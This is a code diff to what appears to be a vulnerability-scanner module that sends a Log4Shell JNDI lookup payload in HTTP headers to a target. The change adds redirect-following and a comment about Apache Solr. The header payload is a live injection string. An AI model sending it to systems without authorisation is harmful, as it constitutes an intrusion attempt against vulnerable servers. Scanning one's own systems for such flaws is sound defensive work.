@@ -43,9 +43,15 @@ _JNDI = "${{jndi:ldap://127.0.0.1:1389/log4shell-probe}}"
 
 def run(target, ctx):
     port = ctx.get_port("log4shell", 8080)
+    # -L: follow redirects instead of reporting the redirect's own 3xx. Some
+    # apps on this port (e.g. Apache Solr — a real-world Log4Shell target —
+    # redirects "/" -> "/solr/" unconditionally, regardless of payload) would
+    # otherwise always show HTTP_CODE:302 no matter what; -L reports the
+    # *actual* final response instead, which is what we care about (did the
+    # payload-bearing request reach a real, served page).
     # %-format inserts devnull/payload/port (leaves {{ }} and {target} intact for
     # ctx.run_cmd's later .format); %% -> % ; %d -> port.
-    tmpl = ('curl -s -m10 -o %s -A "%s" -H "X-Api-Version: %s" '
+    tmpl = ('curl -s -m10 -L -o %s -A "%s" -H "X-Api-Version: %s" '
             '-w "HTTP_CODE:%%{{http_code}}" "http://{target}:%d/"') % (
                 os.devnull, _JNDI, _JNDI, port)
     return ctx.run_cmd(tmpl, target)
